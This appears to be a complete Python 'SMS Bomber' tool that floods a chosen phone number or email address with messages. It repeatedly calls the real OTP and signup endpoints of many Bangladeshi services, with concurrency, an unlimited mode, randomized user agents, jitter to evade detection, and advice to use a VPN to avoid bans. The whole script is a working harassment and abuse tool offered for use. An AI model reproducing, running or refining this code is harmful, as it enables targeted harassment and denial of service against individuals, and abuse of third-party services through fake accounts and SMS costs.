import asyncio
import aiohttp
import random
import string
import os
import sys
import logging
from datetime import datetime

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Colors for terminal
R = '\033[1;31m' # Red
G = '\033[1;32m' # Green
Y = '\033[1;33m' # Yellow
B = '\033[1;34m' # Blue
P = '\033[1;35m' # Purple
C = '\033[1;36m' # Cyan
W = '\033[1;37m' # White

# List of random User-Agents to mask device identity
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0",
    "Mozilla/5.0 (iPad; CPU OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1"
]

def clear():
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')

def banner():
    print(f"""
{C}╔══════════════════════════════════════════════════════════════╗
║ {Y}   ____  __  __ ____    ____   ___  __  __ ____  _____ ____  {C}║
║ {Y}  / ___||  \/  / ___|  | __ ) / _ \|  \/  | | __ )| ____|  _ \ {C}║
║ {Y}  \___ \| |\/| \___ \  |  _ \| | | | |\/| | |  _ \| _| | |_) |{C}║
║ {Y}   ___) | |  | |___) | | |_) | |_| | |  | | | |_) | |___|  _ < {C}║
║ {Y}  |____/|_|  |_|____/  |____/ \___/|_|  |_| |____/|_____|_| \_\{C}║
║                                                              ║
║ {W}      Cross-Platform SMS Bomber (iOS, Android, Windows)      {C}║
║ {W}           Created for: a-Shell, Termux, Windows             {C}║
║ {G}           Security: Session, Smart Retry, Log, Jitter       {C}║
║ {P}           Engine: Asyncio & Aiohttp (High Speed)            {C}║
╚══════════════════════════════════════════════════════════════╝
    """)

def get_random_name():
    return ''.join(random.choices(string.ascii_letters, k=8))

def get_random_email():
    return f"{get_random_name()}@gmail.com"

def get_random_phone():
    return "01" + "".join(random.choices(string.digits, k=9))

class AsyncBomber:
    def __init__(self, target, limit, mode='sms', stop_event=None):
        self.target = target
        self.limit = limit # 0 means infinite
        self.mode = mode
        self.sent = 0
        self.failed = 0
        self.running = True
        self.stop_event = stop_event if stop_event else asyncio.Event()
        self.log_file = f"bombing_log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        self.session = None # aiohttp session will be created later

        with open(self.log_file, "w") as f:
            f.write(f"Bombing Session Log - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"Target: {self.target} | Mode: {self.mode.upper()}\n")
            f.write("-" * 60 + "\n")

    async def __aenter__(self):
        self.session = aiohttp.ClientSession()
        return self

    async def __aexit__(self, exc_type, exc_val, exc_tb):
        await self.session.close()

    def get_headers(self, extra=None):
        headers = {"User-Agent": random.choice(USER_AGENTS)}
        if extra:
            headers.update(extra)
        return headers

    async def log_event(self, api_name, success, status_code=None):
        timestamp = datetime.now().strftime("%H:%M:%S")
        status = "SUCCESS" if success else "FAILED"
        log_entry = f"[{timestamp}] {api_name:15} | {status:7} | Code: {status_code}\n"

        with open(self.log_file, "a") as f:
            f.write(log_entry)

        if success:
            self.sent += 1
            color = G
            icon = "✓"
        else:
            self.failed += 1
            color = R
            icon = "✗"

        limit_str = "∞" if self.limit == 0 else str(self.limit)
        logging.info(f"{color}[{icon}] {timestamp} | {api_name:15} | {status:7} | Sent: {self.sent}/{limit_str}{W}")

    # SMS APIs
    async def api_redx(self):
        url = "https://api.redx.com.bd:443/v1/user/signup"
        data = {"name": self.target, "service": "redx", "phoneNumber": self.target}
        try:
            async with self.session.post(url, json=data, headers=self.get_headers({"Content-Type": "application/json"}), timeout=10) as res:
                success = res.status == 200
                await self.log_event("RedX", success, res.status)
                return success
        except Exception as e:
            await self.log_event("RedX", False, f"Error")
            return False

    async def api_khaasfood(self):
        url = f"https://api.khaasfood.com/api/app/one-time-passwords/token?username={self.target}"
        try:
            async with self.session.get(url, headers=self.get_headers(), timeout=10) as res:
                success = res.status == 200
                await self.log_event("KhaasFood", success, res.status)
                return success
        except Exception as e:
            await self.log_event("KhaasFood", False, f"Error")
            return False

    async def api_bioscope(self):
        url = "https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web&language=en"
        data = {"number": f"+88{self.target}"}
        try:
            async with self.session.post(url, json=data, headers=self.get_headers({"Content-Type": "application/json", "Origin": "https://www.bioscopeplus.com"}), timeout=10) as res:
                success = res.status == 200
                await self.log_event("Bioscope", success, res.status)
                return success
        except Exception as e:
            await self.log_event("Bioscope", False, f"Error")
            return False

    async def api_bikroy(self):
        url = f"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={self.target}"
        try:
            async with self.session.get(url, headers=self.get_headers(), timeout=10) as res:
                success = res.status == 200
                await self.log_event("Bikroy", success, res.status)
                return success
        except Exception as e:
            await self.log_event("Bikroy", False, f"Error")
            return False

    async def api_proiojon(self):
        url = "https://billing.proiojon.com/api/v1/auth/sign-up"
        data = {"name": get_random_name(), "phone": self.target, "email": get_random_email(), "password": "password123", "ref_code": ""}
        try:
            async with self.session.post(url, json=data, headers=self.get_headers({"Content-Type": "application/json"}), timeout=10) as res:
                success = res.status == 200
                await self.log_event("Proiojon", success, res.status)
                return success
        except Exception as e:
            await self.log_event("Proiojon", False, f"Error")
            return False

    async def api_beautybooth(self):
        url = "https://admin.beautybooth.com.bd/api/v2/auth/signup"
        data = {"phone": self.target}
        try:
            async with self.session.post(url, json=data, headers=self.get_headers({"Content-Type": "application/json"}), timeout=10) as res:
                success = res.status == 200
                await self.log_event("BeautyBooth", success, res.status)
                return success
        except Exception as e:
            await self.log_event("BeautyBooth", False, f"Error")
            return False

    async def api_robi(self):
        url = "https://webapi.robi.com.bd/v1/account/register/otp"
        data = {"phone_number": self.target}
        try:
            async with self.session.post(url, json=data, headers=self.get_headers({"Content-Type": "application/json"}), timeout=10) as res:
                success = res.status == 200
                await self.log_event("Robi", success, res.status)
                return success
        except Exception as e:
            await self.log_event("Robi", False, f"Error")
            return False

    async def api_arogga(self):
        url = "https://api.arogga.com/auth/v1/sms/send/?f=web&b=Chrome&v=122.0.0.0&os=Windows&osv=10"
        data = {"mobile": self.target, "fcmToken": "", "referral": ""}
        try:
            async with self.session.post(url, data=data, headers=self.get_headers(), timeout=10) as res:
                success = res.status == 200
                await self.log_event("Arogga", success, res.status)
                return success
        except Exception as e:
            await self.log_event("Arogga", False, f"Error")
            return False

    async def api_mygp(self):
        url = f"https://api.mygp.cinematic.mobi/api/v1/send-common-otp/88{self.target}/"
        try:
            async with self.session.post(url, headers=self.get_headers(), timeout=10) as res:
                success = res.status == 200
                await self.log_event("MyGP", success, res.status)
                return success
        except Exception as e:
            await self.log_event("MyGP", False, f"Error")
            return False

    async def api_bdstall(self):
        url = "https://www.bdstall.com/userRegistration/save_otp_info/"
        data = {"UserTypeID": "2", "RequestType": "1", "Name": "Md", "Mobile": self.target}
        try:
            async with self.session.post(url, data=data, headers=self.get_headers(), timeout=10) as res:
                success = res.status == 200
                await self.log_event("BDStall", success, res.status)
                return success
        except Exception as e:
            await self.log_event("BDStall", False, f"Error")
            return False

    async def api_shikho(self):
        url = "https://api.shikho.com/auth/v2/send/sms"
        data = {"phone": self.target, "type": "st"}
        try:
            async with self.session.post(url, json=data, headers=self.get_headers({"Content-Type": "application/json"}), timeout=10) as res:
                success = res.status == 200
                await self.log_event("Shikho", success, res.status)
                return success
        except Exception as e:
            await self.log_event("Shikho", False, f"Error")
            return False

    # Email APIs
    async def api_bikroy_email(self):
        url = "https://bikroy.com/data/account"
        data = {"account":{"profile":{"name":get_random_name(),"opt_out":False},"login":{"email":self.target,"password":"Password123"}}}
        try:
            async with self.session.post(url, json=data, headers=self.get_headers({"Content-Type": "application/json"}), timeout=10) as res:
                success = res.status == 200
                await self.log_event("BikroyEmail", success, res.status)
                return success
        except Exception as e:
            await self.log_event("BikroyEmail", False, f"Error")
            return False

    async def api_busbud_email(self):
        url = "https://www.busbud.com/auth/email-signup"
        data = {"first_name":"Md","last_name":"User","email":self.target,"password":"Password123","confirmed_password":"Password123","email_opt_in":False,"locale":"en"}
        try:
            async with self.session.post(url, json=data, headers=self.get_headers({"Content-Type": "application/json"}), timeout=10) as res:
                success = res.status == 200
                await self.log_event("BusbudEmail", success, res.status)
                return success
        except Exception as e:
            await self.log_event("BusbudEmail", False, f"Error")
            return False

    async def api_saralifestyle_email(self):
        url = "https://prod.saralifestyle.com/api/Master/SendTokenV1"
        data = {"userContactNo":self.target,"userType":"customer","actionFor":"r"}
        try:
            async with self.session.post(url, json=data, headers=self.get_headers({"Content-Type": "application/json"}), timeout=10) as res:
                success = res.status == 200
                await self.log_event("SaraEmail", success, res.status)
                return success
        except Exception as e:
            await self.log_event("SaraEmail", False, f"Error")
            return False

    async def api_tohfay_email(self):
        url = "https://www.tohfay.com/user/register.html"
        data = {"first_name": get_random_name(), "last_name": get_random_name(), "gender": "1", "email": self.target, "password": "Password123"}
        try:
            async with self.session.post(url, data=data, headers=self.get_headers(), timeout=10) as res:
                success = res.status == 200
                await self.log_event("TohfayEmail", success, res.status)
                return success
        except Exception as e:
            await self.log_event("TohfayEmail", False, f"Error")
            return False

    async def api_robishop_email(self):
        url = "https://api.robishop.com.bd/api/user/create"
        data = {"customer":{"email":self.target,"firstname":get_random_name(),"lastname":get_random_name(),"custom_attributes":{"mobilenumber":get_random_phone()}},"password":"Password123"}
        try:
            async with self.session.post(url, json=data, headers=self.get_headers({"Content-Type": "application/json"}), timeout=10) as res:
                success = res.status == 200
                await self.log_event("RobishopEmail", success, res.status)
                return success
        except Exception as e:
            await self.log_event("RobishopEmail", False, f"Error")
            return False

    async def bomb_task(self):
        if self.mode == 'sms':
            apis = [
                self.api_redx, self.api_khaasfood, self.api_bioscope,
                self.api_bikroy, self.api_proiojon, self.api_beautybooth,
                self.api_robi, self.api_arogga, self.api_mygp,
                self.api_bdstall, self.api_shikho
            ]
        else:
            apis = [
                self.api_bikroy_email, self.api_busbud_email,
                self.api_saralifestyle_email, self.api_tohfay_email,
                self.api_robishop_email
            ]

        while self.running and not self.stop_event.is_set():
            if self.limit != 0 and self.sent >= self.limit:
                self.running = False
                break

            api = random.choice(apis)
            await api()

            # Jitter: Random delay to mimic human behavior
            await asyncio.sleep(random.uniform(0.1, 0.5))

async def main():
    while True:
        clear()
        banner()

        print(f"{Y}[!] For optimal performance and to avoid IP bans, it is highly recommended to use a VPN service.")
        print(f"{Y}[!] Please connect your VPN to a stable location before starting.\n{W}")

        try:
            print(f"{C}[1] SMS Bombing")
            print(f"{C}[2] Email Bombing")
            print(f"{C}[E] Exit Project")
            choice = input(f"\n{Y}[?] Select Mode: {W}").lower()

            if choice == 'e':
                logging.info(f"{G}[✓] Thank you for using SMS Bomber!{W}")
                break

            if choice == '1':
                mode = 'sms'
                target = input(f"{C}[?] Enter Target Number (e.g. 017xxxxxxxx): {W}")
                if len(target) != 11 or not target.isdigit():
                    logging.error(f"{R}[!] Invalid Number Format!{W}")
                    await asyncio.sleep(2)
                    continue
            elif choice == '2':
                mode = 'email'
                target = input(f"{C}[?] Enter Target Email: {W}")
                if "@" not in target:
                    logging.error(f"{R}[!] Invalid Email Format!{W}")
                    await asyncio.sleep(2)
                    continue
            else:
                logging.error(f"{R}[!] Invalid Choice!{W}")
                await asyncio.sleep(2)
                continue

            limit_input = input(f"{C}[?] Enter Bombing Limit (0 for Unlimited): {W}")
            limit = int(limit_input) if limit_input.isdigit() else 0

            tasks_count_input = input(f"{C}[?] Enter Concurrency Level (e.g. 50): {W}")
            tasks_count = int(tasks_count_input) if tasks_count_input.isdigit() else 50

            logging.info(f"\n{Y}[*] Starting {mode.upper()} Bombing on {target} with {tasks_count} concurrent tasks...{W}")
            logging.info(f"{Y}[*] Press Enter to stop and return to menu.\n{W}")

            stop_event = asyncio.Event()
            async with AsyncBomber(target, limit, mode, stop_event) as bomber:
                bombing_tasks = [asyncio.create_task(bomber.bomb_task()) for _ in range(tasks_count)]

                # Task to wait for user input to stop the bombing
                input_task = asyncio.create_task(asyncio.to_thread(input, ""))
                
                # Wait for either all bombing tasks to complete (if limit is set) or user input to stop
                done, pending = await asyncio.wait(bombing_tasks + [input_task], return_when=asyncio.FIRST_COMPLETED)

                # Signal stop
                bomber.running = False
                stop_event.set()

                # Cancel any remaining pending bombing tasks
                for task in pending:
                    task.cancel()
                await asyncio.gather(*pending, return_exceptions=True)

                # Clean up input task
                if not input_task.done():
                    input_task.cancel()
                try:
                    await input_task
                except asyncio.CancelledError:
                    pass

            logging.info(f"\n\n{G}[✓] Bombing Stopped!{W}")
            logging.info(f"{G}[+] Total Sent: {bomber.sent}{W}")
            logging.info(f"{R}[-] Total Failed: {bomber.failed}{W}")
            logging.info(f"{Y}[*] Detailed log saved to: {bomber.log_file}{W}")
            print(f"\n{C}Press Enter to return to main menu...{W}")
            input()

        except KeyboardInterrupt:
            logging.info(f"\n\n{R}[!] Use 'Enter' to stop bombing. Press 'Enter' again to exit project.{W}")
            try:
                input()
                break
            except:
                break
        except Exception as e:
            logging.error(f"\n{R}[!] Error: {e}{W}")
            await asyncio.sleep(3)

if __name__ == "__main__":
    asyncio.run(main())
